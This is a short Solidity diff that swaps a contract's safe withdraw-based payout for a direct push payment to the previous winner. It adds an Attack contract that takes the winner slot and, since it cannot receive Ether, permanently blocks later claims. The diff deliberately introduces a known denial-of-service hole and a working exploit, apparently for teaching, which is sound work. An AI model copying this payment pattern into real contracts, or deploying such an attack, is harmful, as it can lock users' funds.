@@ -3,24 +3,26 @@ pragma solidity ^0.8.13;
 contract WinnerOfEther {
     address public winner;
     uint public balance;
-    mapping(address => uint) public balances;
 
-    function claimPot() external payable {
-        require(msg.value > balance, "Need to pay more to become the winner");
+    function claimContract() external payable {
+        require(msg.value > balance, "Need to pay more to become the king");
 
-        balances[winner] += balance;
+        (bool sent, ) = winner.call{value: balance}("");
+        require(sent, "Failed to send Ether");
 
         balance = msg.value;
         winner = msg.sender;
     }
+}
 
-    function withdraw() public {
-        require(msg.sender != winner, "Current winner cannot withdraw");
+contract Attack {
+    WinnerOfEther winnerOfEther;
 
-        uint amount = balances[msg.sender];
-        balances[msg.sender] = 0;
+    constructor(WinnerOfEther _winnerOfEther) {
+        winnerOfEther = WinnerOfEther(_winnerOfEther);
+    }
 
-        (bool sent, ) = msg.sender.call{value: amount}("");
-        require(sent, "Failed to send Ether");
+    function attack() public payable {
+        winnerOfEther.claimContract{value: msg.value}();
     }
 }
